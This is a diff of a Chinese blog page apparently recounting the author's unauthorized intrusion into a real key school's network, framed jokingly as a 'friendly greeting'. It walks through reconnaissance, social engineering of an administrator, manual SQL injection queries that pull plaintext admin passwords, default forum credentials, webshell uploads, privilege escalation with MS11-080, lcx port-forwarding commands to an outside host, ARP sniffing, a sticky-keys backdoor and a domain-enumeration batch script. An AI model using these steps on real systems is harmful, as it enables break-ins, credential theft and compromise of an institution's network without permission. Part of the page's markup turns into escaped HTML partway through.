@@ -1,155 +1,446 @@
-<!DOCTYPE html>
-<html>
 
+ <!DOCTYPE HTML>
+<html  xmlns:wb="http://open.weibo.com/wb">
 <head>
-  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>友谊的 招呼 -对母校的亲密检测 | Blog of Secer</title>
-  <meta name="description" content="" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="MobileOptimized" content="320" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
-  <link rel="stylesheet" type="text/css" href="/css/style.css" />
-  <meta name="generator" content="Blog of Secer">
-
+  <meta charset="UTF-8">
   
-  
-  
-
-  
+    <title>友谊的 招呼 -对母校的亲密检测 | Blog of Secer</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Secer">
+    
+    <meta name="description" content="我记得在校的时候某校的领导以及老师来到我们学校参观，虽然我见到对方学校的领导我会非常有礼貌的打招呼，一次回到家里的时候，出于友谊，决定为此国家重点级的学校进行友情的“招呼”！  国家级重点级，相对震精的学校，最近我在看《黑客与画家》，里面第一篇的内容是“为什么书呆子不受欢迎”，有段作者是说公立的学校的老师就像监狱里的狱卒，除了防止你打架做坏事之外，都不会管你！我就得说得非常好！作为国家级重点级的学校，这也是更加的！好了，不说题外话了，这篇文章是以前“招呼”的了！所以现在写下来，给大家参考下，虽然不是很好，但是各位也不要喷我吧！  我重申一次，我确实是个贱人  0x00  作为国家级的重点学校，我听说他的服务器是ZF给的，买了200W左右，当然我也参观过，虽然外表看不出来，我想那个网管老师也不会吹牛B吧，就是这样才出于好奇心，才弄得！    为了防止被万人骑，所以部分过滤了！  手握神器，开始动工！这次的“招呼”任务我会在win下进行，当然如果需要的情况下，我会使用win+linux交互渗透！  0x01  踩点。  作为一个国家级的重点学校，我相信安全也是非常好的！起码也是服务器独立域名，内网等吧！收集下信息，我会采用某社工神器这个软件我非常喜欢    说下他的用途吧，适用大型渗透适用    有各种信息的收集，不懂E文的朋友，可能会比较亏哦！这个工具其实已经融入了bt5系列了，呵呵，说下现在收集到的情况吧。Win03+iis6.0+内网+C段一个站，无CDN，asp+php+aspx，C段的站是asp+aspx+win03+iis6.0+内网！招聘站一个，三台服务器的管理都是同一人，说下怎么收集的吧！首先google语法。Site:url inurl:asp|php|aspx|jsp。还有根据报错等清楚是iis，我就比较懒，火狐插件直接获得    对两台服务器进行了扫描端口与分析工作，在win下，我会选择用superscan，如果在linux下我会选择更为精准的nmap！superscan比较简单，因为在gui，直接填入IP和所需的端口就行了，如果在linux下的nmap格式就是：namp –v –a ip  得到的端口有：  21 ftp  80 www  面对以上者两个端口，可以参考的攻击思路如下：  21—爆破模式，或者社工，嗅探等。  80—iis写权限，以及脚本渗透。  有些人问，不是有php和aspx吗？！应该会扫描到1433和3306的啊！很简单，以为他不允许对外访问，或者内网，他就扫描不出了啊。  扫描了整站目录以及文件，有二级目录上的站。暂时没发现主站的后台，另一个分站是教师系统，我见过那些老师是在上面进行公告浏览以及发布什么规定的地方。">
+    
+    
+    
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="333" />
+    <meta name="twitter:title" content="友谊的 招呼 -对母校的亲密检测 | Blog of Secer" />
+      
+    
+    
+    <link rel="alternate" href="atom.xml" title="Blog of Secer" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/pacman.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/pacman.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
 </head>
 
-<!--
-<body class="post-template">
--->
-<body class="home-template">
-<div id="perspective" class="perspective effect-movedown">
-  <div class="container">
-    <!-- wrapper -->
-    <div class="wrapper">
+  <body>
+    <header>
+      <div>
+		
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="Blog of Secer">Blog of Secer</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives">文章</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+						<li><a href="/atom.xml">RSS订阅</a></li>
+					
+					<li>
+					
+					<form class="search" action="/search/index.html" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="30" placeholder="Search" />
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
 
-      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
-    <div class="vertical">
-        <div class="site-head-content inner">
-             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
-            <h1 class="blog-title">Blog of Secer</h1>
-            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
-        </div>
-    </div>
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/779.seo/" title="友谊的 招呼 -对母校的亲密检测" itemprop="url">友谊的 招呼 -对母校的亲密检测</a>
+  </h1>
+  <!-- 显示作者
+  <p class="article-author">By
+    
+      <a href="http://ha.cker.in" title="Secer">Secer</a>
+    </p>
+  -->  
+  <p class="article-time">
+    <time datetime="2012-08-30T22:01:40.000Z" itemprop="datePublished">2012-08-31</time>
+    Updated:<time datetime="2016-08-20T11:03:53.000Z" itemprop="dateModified">2016-08-20</time>
+    
+  </p>
 </header>
 
-      
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		
+		</div>
+		
+		<p>我记得在校的时候某校的领导以及老师来到我们学校参观，虽然我见到对方学校的领导我会非常有礼貌的打招呼，一次回到家里的时候，出于友谊，决定为此国家重点级的学校进行友情的“招呼”！</p>  <p>国家级重点级，相对震精的学校，最近我在看《黑客与画家》，里面第一篇的内容是“为什么书呆子不受欢迎”，有段作者是说公立的学校的老师就像监狱里的狱卒，除了防止你打架做坏事之外，都不会管你！我就得说得非常好！作为国家级重点级的学校，这也是更加的！好了，不说题外话了，这篇文章是以前“招呼”的了！所以现在写下来，给大家参考下，虽然不是很好，但是各位也不要喷我吧！</p>  <p>我重申一次，我确实是个贱人</p>  <p>0x00</p>  <p>作为国家级的重点学校，我听说他的服务器是ZF给的，买了200W左右，当然我也参观过，虽然外表看不出来，我想那个网管老师也不会吹牛B吧，就是这样才出于好奇心，才弄得！</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/df99b5f14772_C386/clip_image002_thumb.jpg" width="574" height="286"></a></p>  <p>为了防止被万人骑，所以部分过滤了！</p>  <p>手握神器，开始动工！这次的“招呼”任务我会在win下进行，当然如果需要的情况下，我会使用win+linux交互渗透！</p>  <p>0x01</p>  <p>踩点。</p>  <p>作为一个国家级的重点学校，我相信安全也是非常好的！起码也是服务器独立域名，内网等吧！收集下信息，我会采用某社工神器这个软件我非常喜欢</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image004.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/df99b5f14772_C386/clip_image004_thumb.jpg" width="573" height="358"></a></p>  <p>说下他的用途吧，适用大型<a href="http://ha.cker.in/tag/渗透" target="_blank">渗透</a>适用</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image006.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/df99b5f14772_C386/clip_image006_thumb.jpg" width="128" height="478"></a></p>  <p>有各种信息的收集，不懂E文的朋友，可能会比较亏哦！这个工具其实已经融入了bt5系列了，呵呵，说下现在收集到的情况吧。Win03+iis6.0+内网+C段一个站，无CDN，asp+php+aspx，<a href="http://ha.cker.in/tag/C段" target="_blank">C段</a>的站是asp+aspx+win03+iis6.0+内网！招聘站一个，三台服务器的管理都是同一人，说下怎么收集的吧！首先google语法。Site:url inurl:asp|php|aspx|jsp。还有根据报错等清楚是iis，我就比较懒，火狐插件直接获得</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image008.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image008" border="0" alt="clip_image008" src="http://img.cker.in/df99b5f14772_C386/clip_image008_thumb.jpg" width="445" height="275"></a></p>  <p>对两台服务器进行了扫描端口与分析工作，在win下，我会选择用superscan，如果在linux下我会选择更为精准的nmap！superscan比较简单，因为在gui，直接填入IP和所需的端口就行了，如果在linux下的nmap格式就是：namp –v –a ip</p>  <p>得到的端口有：</p>  <p>21 ftp</p>  <p>80 www</p>  <p>面对以上者两个端口，可以参考的攻击思路如下：</p>  <p>21—爆破模式，或者社工，嗅探等。</p>  <p>80—iis写权限，以及脚本渗透。</p>  <p>有些人问，不是有php和aspx吗？！应该会扫描到1433和3306的啊！很简单，以为他不允许对外访问，或者内网，他就扫描不出了啊。</p>  <p>扫描了整站目录以及文件，有二级目录上的站。暂时没发现主站的后台，另一个分站是教师系统，我见过那些老师是在上面进行公告浏览以及发布什么规定的地方。</p><a id="more"></a><p></p>  <p>根据网站上留下来的QQ以及姓名的某个字</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image010.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image010" border="0" alt="clip_image010" src="http://img.cker.in/df99b5f14772_C386/clip_image010_thumb.jpg" width="226" height="50"></a></p>  <p>社工得到网站管理的部分资料</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image012.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image012" border="0" alt="clip_image012" src="http://img.cker.in/df99b5f14772_C386/clip_image012_thumb.jpg" width="312" height="307"></a></p>  <p>常用密码怎么知道的？！很简单，拿出你的裤，以及密码社工，马上得到！非常好！得到管理信息对之后非常有用！踩点差不多了！进行下一步工作吧！</p>  <p>0x02</p>  <p>战争的开始！</p>  <p>对于以上的信息，为我们的战争的做好了充分的准备，对于初期的脚本初探，对于大站我会选择安全评估工具，例如：国产的jsky，国外的wvs等，这两个大家都是非常常用，对于我来说，一般我都只用些简单的工具就行了，没什么必要都很少用。主站的是asp，因为找不到后台原因，而且还有二级目录上的站，多数都站都会疏忽二级目录上的站的安全，所以我偷笑了！</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image014.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image014" border="0" alt="clip_image014" src="http://img.cker.in/df99b5f14772_C386/clip_image014_thumb.jpg" width="573" height="324"></a></p>  <p>经过google收集了下，非常多，而且我听说我那边的朋友说，他们学校以前给某师兄来过，所以安全应该会加固了很多！比较懒，老规矩，都是由软件去跑。呵呵！结果下来了<a href="http://img.cker.in/df99b5f14772_C386/clip_image016.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image016" border="0" alt="clip_image016" src="http://img.cker.in/df99b5f14772_C386/clip_image016_thumb.jpg" width="573" height="385"></a></p>  <p>后台地址显示500貌似是坏了啊！如果不是坏了，就是不显示吧！反正后台页面显示正常！</p>  <p>来检测下吧，是asp搭建的系统，找个带参数的地方测试下注射漏洞吧！<a href="http://img.cker.in/df99b5f14772_C386/clip_image018.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image018" border="0" alt="clip_image018" src="http://img.cker.in/df99b5f14772_C386/clip_image018_thumb.jpg" width="573" height="300"></a></p>  <p>搞注射我觉得手工比工具快，所以所以就手工来了！</p>  <p><a href="http://www.xxx.com/XXX/XXX/onews.asp?id=101" target="_blank" rel="external">http://www.XXX.com/XXX/XXX/onews.asp?id=101</a>’ /<em>出错</em></p>  <p><a href="http://www.xxx.com/XXX/XXX/onews.asp?id=101" target="_blank" rel="external">http://www.XXX.com/XXX/XXX/onews.asp?id=101</a> and 1=1 /正常</p>  <p><a href="http://www.xxx.com/XXX/XXX/onews.asp?id=101" target="_blank" rel="external">http://www.XXX.com/XXX/XXX/onews.asp?id=101</a> and 1=2 /<em>出错</em></p>  <p><a href="http://www.xxx.com/XXX/XXX/onews.asp?id=101" target="_blank" rel="external">http://www.XXX.com/XXX/XXX/onews.asp?id=101</a> order by 10 /正常</p>  <p><a href="http://www.xxx.com/XXX/XXX/onews.asp?id=101" target="_blank" rel="external">http://www.XXX.com/XXX/XXX/onews.asp?id=101</a> order by 12 /<em>出错</em></p>  <p><a href="http://www.xxx.com/XXX/XXX/onews.asp?id=101" target="_blank" rel="external">http://www.XXX.com/XXX/XXX/onews.asp?id=101</a> order by 11 /正常</p>  <p><a href="http://www.xxx.com/XXX/XXX/onews.asp?id=101" target="_blank" rel="external">http://www.XXX.com/XXX/XXX/onews.asp?id=101</a> union select 1,2,3,4,5,6,7,8,9,10,11 from admin /<em>显示错位，这里如果不行的就换过另外一种方法一个一个字母来猜，或者换过一个表，我比较懒，所以直接联合查询了！</em></p>  <p><a href="http://www.xxx.com/XXX/XXX/onews.asp?id=101" target="_blank" rel="external">http://www.XXX.com/XXX/XXX/onews.asp?id=101</a> union select 1,password,username,4,5,6,7,8,9,10,11 from admin /貌似出错了，这里有个技巧，因为有后台，看后台源码，一些程序猿写网站系统的时候会把字段写在后台页面哪里，<a href="http://img.cker.in/df99b5f14772_C386/clip_image020.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image020" border="0" alt="clip_image020" src="http://img.cker.in/df99b5f14772_C386/clip_image020_thumb.jpg" width="573" height="146"></a></p>  <p><a href="http://www.xxx.com/XXX/XXX/onews.asp?id=101" target="_blank" rel="external">http://www.XXX.com/XXX/XXX/onews.asp?id=101</a> union select 1,password,admin,4,5,6,7,8,9,10,11 from admin</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image022.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image022" border="0" alt="clip_image022" src="http://img.cker.in/df99b5f14772_C386/clip_image022_thumb.jpg" width="574" height="43"></a></p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image024.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image024" border="0" alt="clip_image024" src="http://img.cker.in/df99b5f14772_C386/clip_image024_thumb.jpg" width="574" height="156"></a></p>  <p>震精了下，居然明文，未经过任何加密！登录后台直接拿shell去了！</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image026.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image026" border="0" alt="clip_image026" src="http://img.cker.in/df99b5f14772_C386/clip_image026_thumb.jpg" width="504" height="211"></a></p>  <p>居然出错了！我记得还有个上传页面哦！<a href="http://img.cker.in/df99b5f14772_C386/clip_image028.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image028" border="0" alt="clip_image028" src="http://img.cker.in/df99b5f14772_C386/clip_image028_thumb.jpg" width="462" height="221"></a></p>  <p>根据经验这个是雷池的上传，是以get形式提交的！可以构造上传名字</p>  <p>uploadpic.asp?actiontype=mod&amp;picname=miao.asp</p>  <p>这样，然后再浏览器里回车一下，然后上传直接改名字为miao.asp，经过多方测试，貌似改名字了，但是都是显示404，开始以为杀软非常强大，把我的所以免杀马儿都干掉了，然后改下构造页面uploadpic.asp?actiontype=mod&amp;picname=miao.txt ，上传后得到的名字是miao.txt，这个应该不是被杀了吧！上传后发现还是404，就觉得不对劲了，可能是上传坏了或者目录不能写了！换过其他地方来X吧。他是很多这些二三级目录的系统，都是同一种，都是去除了权限。于是就转战了招聘站。</p>  <p>0x03</p>  <p>希望被破灭！</p>  <p><a href="http://img.cker.in/df99b5f14772_C386/clip_image030.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image030" border="0" alt="clip_image030" src="http://img.cker.in/df99b5f14772_C386/clip_image030_thumb.jpg" width="573" height="347"></a></p>  <p>一般来说招聘网是分为企业者和招聘者。一般都有上传头像或者企业图片的地方，我很开心，说不定能直接getshell，但是当我注册了账号进去后，貌似不好突破呢，上传都是非常严格，在经过明小子和bs改包上传都不行，这个站貌似是万企捐献的，简单来说是万企建的站，之前不是说万企有个通杀的漏洞吗，发现这里是没有的，经过一番围观，貌似看见就业论坛的字眼耶<a href="http://img.cker.in/df99b5f14772_C386/clip_image032.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image032" border="0" alt="clip_image032" src="http://img.cker.in/df99b5f14772_C386/clip_image032_thumb.jpg" width="78" height="61"></a>，一看是dvbbs8.3的搭建的论坛，有sql注入，不过还是先测试下默认账号密码，admin，admin888，bingo，正在登陆<a href="http://img.cker.in/df99b5f14772_C386/clip_image034.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image034" border="0" alt="clip_image034" src="http://img.cker.in/df99b5f14772_C386/clip_image034_thumb.jpg" width="389" height="46"></a>这个也下了，虽然有几个管理，因为留着社工管理，还是留着用。在后台拿shell 添加php就行了，在论坛上传的时候貌似404，要不被杀了，要不不可写，但是上传图片时候能显示，还有就是网上说的添加ashx，但是我是没成功过的，可能我比较倒霉<code>``。当然本地搭建的起码成功了，我爱本地搭建的，但是不是他论坛上的shell··· 好吧，来添加看看，上传成功，根据代码，在根目录生成一个一句话后门，名为XX.asp，但是访问都是404，你妹的添加，又是没成功，我爱他，但是他还是不爱我的。现在基本失去希望了，只有返回招聘网主目录看看吧，测试着搜寻型注入等注入地方，貌似都是过滤了，看到下载中心，会不会有下载漏洞呢？！下载文件，还有登录的用户啊，真麻烦！&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image036.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image036&quot; border=&quot;0&quot; alt=&quot;clip_image036&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image036_thumb.jpg&quot; width=&quot;574&quot; height=&quot;511&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;看到什么了吗！？我相信聪明的朋友已经看出什么了，至于他有没有做好防范呢？！这不得而知，需要实践下才能确认，&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image038.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image038&quot; border=&quot;0&quot; alt=&quot;clip_image038&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image038_thumb.jpg&quot; width=&quot;242&quot; height=&quot;70&quot; /&gt;&lt;/a&gt;貌似没有过滤耶，这时心情才好了点，根据信息，进入了后台，进去没多久就出来了- -· 居然里面非常严格，什么利用信息也没找到！&lt;/p&gt;  &lt;p&gt;0x04&lt;/p&gt;  &lt;p&gt;一线希望！&lt;/p&gt;  &lt;p&gt;经过十多分钟在教师登录系统的猜测，一个也没登上，起码我蛋疼了，于是我看到了&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image040.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image040&quot; border=&quot;0&quot; alt=&quot;clip_image040&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image040_thumb.jpg&quot; width=&quot;573&quot; height=&quot;348&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;看见开发公司了吧！至于你看不看得见，反正我看见了！于是萌发了两个方案，其中一个是社工方案，一个源码分析，于是在搜索引擎的帮助下，终于失败告终，这套系统是由此公司开发，需要1k多来购买，网上还没找到开放的源码，我晕，我再晕，我一直晕！好吧，由于第二方案比较YD，所以暂时不会用，不过说下简单思路，有个工具是伪造邮件的吧！我们可以根据伪造发给管理员，说系统升级，需要怎么怎么，你懂的！&lt;/p&gt;  &lt;p&gt;于是先聊会天，等下整理完再来！扯扯淡，聊聊妹纸！&lt;/p&gt;  &lt;p&gt;好了，继续工作吧！&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image042.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image042&quot; border=&quot;0&quot; alt=&quot;clip_image042&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image042_thumb.jpg&quot; width=&quot;574&quot; height=&quot;275&quot; /&gt;&lt;/a&gt;突然在google里翻呀翻，居然在主站里找到了一个XX级目录上的站，非常好！是dedecms，我们看最近爆出许许多多漏洞，我们来YYDD吧，上了杀器，貌似都返回原点了，测试那个xss的，注册用户，填好XSS getshell的信息，发送，等待管理员来认领，一天过去了，没事发生，貌似还没审核啊，于是直接加管理QQ，直接叫他来审核！过了一会上站里看看，貌似没有事情发生啊，文章虽然审核了！直接找后台，利用收集了的信息进行社工！&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://www.xxx.com/XXX/XXX/XXX/dede&quot;&gt;http://www.XXX.com/XXX/XXX/XXX/dede&lt;/a&gt; 貌似没有信息返回啊，怎么404，NND，继续来射吧射吧&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image044.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image044&quot; border=&quot;0&quot; alt=&quot;clip_image044&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image044_thumb.jpg&quot; width=&quot;518&quot; height=&quot;346&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;好吧好吧，好YD的后台，但是还是阻止不了我们前进的脚步，这次没有走远，没有默认的密码，根据手头信息，一个密码一个密码地测试吧，貌似不行，继续构造，最终以“admin XXX”进入后台，后台拿shell，直接写，没有过滤，也不做解释了！在菜刀里看，我擦，居然主站没后台！你妹啊！&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image046.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image046&quot; border=&quot;0&quot; alt=&quot;clip_image046&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image046_thumb.jpg&quot; width=&quot;573&quot; height=&quot;290&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;到webshell里看，全盘权限，ws支持，支持aspx，php，3389开着！然后就是看补丁情况，最后能直接上去一步搞到，先来一套提权方案吧！&lt;/p&gt;  &lt;p&gt;Ws支持，试试提权exp&lt;/p&gt;  &lt;p&gt;Mysql root权限，udf提权&lt;/p&gt;  &lt;p&gt;sa权限，直接KO&lt;/p&gt;  &lt;p&gt;第三方暂时没其他了。&lt;/p&gt;  &lt;p&gt;开始在c盘放上工具，但是一直运行不了，开始以为权限问题，经过一番验证确实是，后来转到e盘，马上搞定了！udf当时测试是被删，服务器是瑞星的，没免杀，sa被降权了！最后以ms011-80搞定&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image048.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image048&quot; border=&quot;0&quot; alt=&quot;clip_image048&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image048_thumb.jpg&quot; width=&quot;239&quot; height=&quot;227&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;然后就不连上去了，之前lcx直接反弹搞定！其他的提权都免了，好快啊！&lt;/p&gt;  &lt;p&gt;0x05&lt;/p&gt;  &lt;p&gt;嗅探之，结束也！&lt;/p&gt;  &lt;p&gt;上去就想马上搞下那个什么系统来，于是嗅探了一回，彻底失望，什么也没有，上班时间，应该会流动很快才对啊，于是我就把发包率调大，还是一样，我不爱他了，cain你妹的！于是根据经验，应该安装了arp防火墙，很简单，直接不停地给网关发就行了。直接down幻境网盾，这个很好用，你基友我一直在用，我也给我的基友们一起用，我推荐大家一起用（这个貌似是成龙拍霸王的广告···），不到一回，马上来了，是吧！很好用，直接抄个账号直接登录，发现只是发邮件的功能和浏览一些管理的公告，一直没嗅探到管理账号，所以在上面找啊找，看下利用的地方，一想，发邮件应该会有上传附件的地方吧，好吧，我YD的手按了发邮件，果断有，虽然限制了 2M，但是我的几十K就够了，没过滤，完成任务，但是还是ms011-80搞定，因为方便么！直接在嗅探的机器里连接，不知道为啥手YD了，按了5下shiift，居然弹cmd窗口了，上去直接把后门删除，完毕。&lt;/p&gt;  &lt;p&gt;0x06&lt;/p&gt;  &lt;p&gt;最终目的。&lt;/p&gt;  &lt;p&gt;好了，现在开始对内网进行X了，当然这也是最终的目的，内网非常大，分为二层三层交换机，经过收集很多网段，当然我的最终目的不是将他的内网全部挂马，而是拿到路由权限，然后完成对某位朋友的约定！&lt;/p&gt;  &lt;p&gt;因为我的机器不是外网，也省得反弹，所以直接骑上肉鸡！主机上用lcx反弹，当然如果你觉得其他好用可以尝试下其他反弹工具，我只是随手拿起来能用就行了，在主机运行上：lcx –listen 51 2008 。webshell上运行： lcx.exe -slave XXX.XXX.XXX.XXX 51 192.168.8.210 3389 ，然后在主机打开远程 输入：127.0.0.1:2008 。有数据回显，表示反弹成功，&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image050.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image050&quot; border=&quot;0&quot; alt=&quot;clip_image050&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image050_thumb.jpg&quot; width=&quot;521&quot; height=&quot;385&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  &lt;p&gt;好了，连上后，我并不会去理他的配置，这个留在最后看也不会迟，首先，我会大致理解下他的拓扑结构，因为我参观过网管室，所以大概知道下情况！反正他就是至少会在三层交换机之中。&lt;/p&gt;  &lt;p&gt;核心交换机--------三层--------二层--------路由等&lt;/p&gt;  &lt;p&gt;现在我的目的是搞定交换机，让教室能正常上网就行了。&lt;/p&gt;  &lt;p&gt;三个域，收集情况我会用批处理去完成这项工作&lt;/p&gt;  &lt;p&gt;@echo off&lt;/p&gt;  &lt;p&gt;setlocal ENABLEDELAYEDEXPANSION&lt;/p&gt;  &lt;p&gt;@FOR /F &amp;quot;usebackq delims=, &amp;quot; %%J IN (`net view /domain ^|find &amp;quot;命令執行成功&amp;quot; /v ^|find &amp;quot;The command completed successfully.&amp;quot; /v ^|find &amp;quot;命令成功完成&amp;quot; /v ^|find &amp;quot;--&amp;quot; /v ^|find &amp;quot;Domain&amp;quot; /v ^|find &amp;quot;&amp;quot; /v ^|find &amp;quot;コマンドは正常に終了しました&amp;quot; /v /i`) do (&lt;/p&gt;  &lt;p&gt;@echo =====domain:%%J========&lt;/p&gt;  &lt;p&gt;@FOR /F &amp;quot;usebackq eol=; delims=, &amp;quot; %%i in (`net view /domain:%%J ^|findstr &amp;quot;\\&amp;quot;`) DO (&lt;/p&gt;  &lt;p&gt;@FOR /F &amp;quot;usebackq eol=; tokens=1,2,3* delims=\\&amp;quot; %%a in (`echo %%i`) do (&lt;/p&gt;  &lt;p&gt;@FOR /F &amp;quot;tokens=1,2,3,4* usebackq delims=: &amp;quot; %%K IN (`@ping -a -n 1 -w 100 %%a ^|findstr &amp;quot;Pinging&amp;quot;`) do (&lt;/p&gt;  &lt;p&gt;@echo \\%%L %%M&lt;/p&gt;  &lt;p&gt;)&lt;/p&gt;  &lt;p&gt;)&lt;/p&gt;  &lt;p&gt;)&lt;/p&gt;  &lt;p&gt;)&lt;/p&gt;  &lt;p&gt;echo %0&lt;/p&gt;  &lt;p&gt;&lt;a href=&quot;http://img.cker.in/df99b5f14772_C386/clip_image052.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img style=&quot;border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px&quot; title=&quot;clip_image052&quot; border=&quot;0&quot; alt=&quot;clip_image052&quot; src=&quot;http://img.cker.in/df99b5f14772_C386/clip_image052_thumb.jpg&quot; width=&quot;168&quot; height=&quot;95&quot; /&gt;&lt;/a&gt;&lt;/p&gt;  